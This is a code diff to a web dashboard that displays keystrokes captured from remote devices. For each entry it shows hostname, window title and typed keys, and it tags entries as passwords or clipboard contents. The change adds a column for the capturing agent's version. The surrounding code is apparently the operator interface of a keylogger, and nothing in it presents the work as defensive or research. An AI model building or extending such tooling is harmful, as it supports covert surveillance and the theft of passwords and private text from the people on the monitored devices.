@@ -93,8 +93,9 @@
           <thead>
             <tr class="bg-slate-900/80 border-b border-slate-800 text-xs font-semibold text-slate-400 uppercase tracking-wider">
               <th class="py-3 px-4 w-52">Time</th>
-              <th class="py-3 px-4 w-40">Host</th>
-              <th class="py-3 px-4 w-72">Window Context</th>
+              <th class="py-3 px-4 w-36">Host</th>
+              <th class="py-3 px-4 w-64">Window Context</th>
+              <th class="py-3 px-4 w-20">Ver</th>
               <th class="py-3 px-4">Activity Payload</th>
             </tr>
           </thead>
@@ -336,7 +337,7 @@ function debounce(fn, ms) {
 async function fetchKeys(resetPage) {
   if (resetPage) currentPage = 0;
   try {
-    let path = '/rest/v1/keystrokes?select=created_at,hostname,window_title,keys&order=created_at.desc&limit=' + PAGE_SIZE + '&offset=' + (currentPage * PAGE_SIZE);
+    let path = '/rest/v1/keystrokes?select=created_at,hostname,window_title,keys,version&order=created_at.desc&limit=' + PAGE_SIZE + '&offset=' + (currentPage * PAGE_SIZE);
     const filterHost = document.getElementById('hostnameInput').value.trim();
     if (filterHost) path += '&hostname=eq.' + encodeURIComponent(filterHost);
     const filterWin = document.getElementById('windowFilter').value.trim();
@@ -351,7 +352,7 @@ async function fetchKeys(resetPage) {
 
     if (!data || data.length === 0) {
       const hasFilter = filterHost || filterWin;
-      tbody.innerHTML = '<tr><td class="py-8 px-4 text-center text-slate-500" colspan="4">' + (hasFilter ? 'No entries match the current filter' : 'No keystrokes recorded yet') + '<br><span class="text-xs text-slate-600">' + (hasFilter ? 'Try adjusting your filter criteria' : 'Make sure the agent is running on the device') + '</span></td></tr>';
+      tbody.innerHTML = '<tr><td class="py-8 px-4 text-center text-slate-500" colspan="5">' + (hasFilter ? 'No entries match the current filter' : 'No keystrokes recorded yet') + '<br><span class="text-xs text-slate-600">' + (hasFilter ? 'Try adjusting your filter criteria' : 'Make sure the agent is running on the device') + '</span></td></tr>';
       return;
     }
 
@@ -374,10 +375,12 @@ async function fetchKeys(resetPage) {
       let winDisplay = escapeHtml(win);
       if (isClipboard) winDisplay = '<span class="inline-flex items-center px-1.5 py-0.5 text-xs font-medium rounded bg-violet-800/40 text-violet-300 border border-violet-700/40">Clipboard</span>';
       else if (isPassword) winDisplay = '<span class="inline-flex items-center px-1.5 py-0.5 text-xs font-medium rounded bg-red-800/40 text-red-300 border border-red-700/40">Password</span>';
+      const ver = row.version != null ? row.version : '-';
       html += '<tr class="' + rowClass + 'hover:bg-slate-800/30 transition-colors">'
         + '<td class="py-3.5 px-4 text-slate-400 whitespace-nowrap">' + time + '</td>'
         + '<td class="py-3.5 px-4 text-emerald-400 font-medium cursor-pointer hover:underline" onclick="editAlias(\'' + host.replace(/'/g, "\\'") + '\')" title="Click to rename">' + escapeHtml(disp) + '</td>'
         + '<td class="py-3.5 px-4 text-slate-300 truncate max-w-xs" title="' + escapeHtml(win) + '">' + winDisplay + '</td>'
+        + '<td class="py-3.5 px-4 text-slate-500 text-xs font-mono">' + ver + '</td>'
         + '<td class="py-3.5 px-4 text-slate-200 mono-log tracking-wide">' + escapeHtml(keys) + '</td>'
         + '</tr>';
     }
